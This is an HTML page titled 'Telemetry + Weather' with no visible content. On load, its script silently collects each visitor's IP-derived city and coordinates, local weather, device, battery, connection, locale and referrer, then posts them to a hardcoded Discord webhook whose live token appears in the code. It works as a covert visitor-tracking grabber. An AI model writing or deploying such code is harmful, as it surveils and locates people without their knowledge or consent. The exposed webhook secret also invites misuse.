<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Telemetry + Weather</title>
</head>
<body>
<script>
(async function(){
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1404864010851062031/iR6vJf4Dx6iS2cqefJ1xr7qep5zz2nJGQTLMZWxLMPZyBFPeRbVuYKPfNDyQI-b0ZCEb";
  if (!WEBHOOK_URL) return;

  // --- helpers ---
  function anonymizeIp(ip){
    if (!ip) return null;
    const v4 = ip.match(/^(\d+)\.(\d+)\.(\d+)\.(\d+)$/);
    if (v4) return `${v4[1]}.${v4[2]}.${v4[3]}.0`;
    const v6 = ip.split(':');
    if (v6.length >= 4) return v6.slice(0,4).join(':') + '::';
    return 'redacted';
  }

  function uaInfo(){
    const ua = navigator.userAgent || '';
    // Basic device detection (lightweight)
    const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
    const isTablet = /Tablet|iPad/i.test(ua);
    const os = (() => {
      if (/Windows NT/i.test(ua)) return 'Windows';
      if (/Mac OS X/i.test(ua) && !/iPhone|iPad|iPod/i.test(ua)) return 'macOS';
      if (/Android/i.test(ua)) return 'Android';
      if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
      if (/Linux/i.test(ua)) return 'Linux';
      return 'Unknown';
    })();
    return {
      userAgent: ua,
      deviceType: isTablet ? 'Tablet' : (isMobile ? 'Mobile' : 'Desktop'),
      os,
      screen: `${screen.width}x${screen.height}`,
      colorDepth: screen.colorDepth || null,
      touch: ('ontouchstart' in window) || navigator.maxTouchPoints > 0
    };
  }

  // Get optional device/battery/connection info
  async function extraDeviceInfo(){
    const out = {};
    try {
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        out.battery = {
          level: Math.round((b.level||0)*100) + '%',
          charging: !!b.charging
        };
      }
    } catch(e){}
    try {
      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (c) out.connection = {
        effectiveType: c.effectiveType || null,
        downlink: c.downlink || null,
        rtt: c.rtt || null
      };
    } catch(e){}
    return out;
  }

  try {
    // 1) Lookup IP + geo
    const geoResp = await fetch("https://ipapi.co/json/"); // free, basic
    const geo = geoResp.ok ? await geoResp.json() : {};
    const anon = anonymizeIp(geo.ip || null);

    // 2) Weather lookup (open-meteo) using returned lat/lon if available
    let weather = null;
    if (geo.latitude && geo.longitude) {
      // open-meteo current weather
      const wresp = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${encodeURIComponent(geo.latitude)}&longitude=${encodeURIComponent(geo.longitude)}&current_weather=true&timezone=auto`);
      if (wresp.ok){
        const wj = await wresp.json();
        if (wj && wj.current_weather) {
          weather = {
            temp_c: wj.current_weather.temperature,
            wind_kph: (wj.current_weather.windspeed||0) * 1.60934,
            wind_m_s: wj.current_weather.windspeed,
            weather_code: wj.current_weather.weathercode,
            time: wj.current_weather.time
          };
        }
      }
    }

    // 3) Device info
    const device = uaInfo();
    const deviceExtra = await extraDeviceInfo();

    // 4) Timestamps & context
    const now = new Date();
    const timestamp_utc = now.toISOString();
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || geo.timezone || null;
    const locale = navigator.language || null;

    // 5) Build Discord embed (clear + cool) with emojis and code block summary
    const embed = {
      title: "🌐 New Visitor",
      description: `📍 **${geo.city || 'Unknown City'}, ${geo.region || geo.region_code || ''} ${geo.country_name || geo.country || ''}**\n🕒 **${now.toLocaleString()} (${timezone || 'TZ'})**`,
      color: 3447003, // blue
      fields: [
        { name: "🔎 Anonymized IP", value: `\`\`\`\n${anon || 'redacted'}\n\`\`\``, inline: true },
        { name: "🖥️ Device", value: `**${device.deviceType}** — ${device.os}\nUA: ${device.userAgent.slice(0,80)}...`, inline: false },
        { name: "📱 Specs", value: `Screen: ${device.screen}\nTouch: ${device.touch}\nLocale: ${locale}`, inline: true },
      ],
      footer: { text: `Referrer: ${document.referrer || 'direct'} • Path: ${location.pathname}`},
      timestamp: timestamp_utc
    };

    if (deviceExtra.battery) {
      embed.fields.push({ name: "🔋 Battery", value: `${deviceExtra.battery.level} • charging: ${deviceExtra.battery.charging}`, inline: true });
    }
    if (deviceExtra.connection) {
      embed.fields.push({ name: "📶 Connection", value: `Type: ${deviceExtra.connection.effectiveType || 'unknown'} • Downlink: ${deviceExtra.connection.downlink || 'n/a'}`, inline: true });
    }
    if (weather) {
      embed.fields.push({ name: "🌦️ Weather (now)", value: `Temp: ${weather.temp_c}°C • Wind: ${weather.wind_kph.toFixed(1)} km/h\nTime: ${weather.time}`, inline: false });
    } else {
      embed.fields.push({ name: "🌦️ Weather", value: "Unavailable", inline: false });
    }

    // 6) Raw context (collapsed code block) for easy copy/paste in Discord
    const raw = {
      anon_ip: anon,
      city: geo.city || null,
      region: geo.region || geo.region_code || null,
      country: geo.country_name || geo.country || null,
      lat: geo.latitude || null,
      lon: geo.longitude || null,
      ts_utc: timestamp_utc,
      ua: device.userAgent,
      pathname: location.pathname,
      referrer: document.referrer || null
    };
    embed.fields.push({ name: "📂 Raw (copyable)", value: `\`\`\`json\n${JSON.stringify(raw, null, 2)}\n\`\`\`` , inline: false });

    // 7) Send to webhook
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] })
    });

    console.log("Telemetry sent:", { anon, geo, device, weather });
  } catch (err) {
    console.error("Telemetry error:", err);
    // Best-effort fallback minimal ping
    try {
      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: `⚠️ Telemetry fallback ping — ${new Date().toISOString()}` })
      });
    } catch(e){}
  }
})();
</script>
</body>
</html>
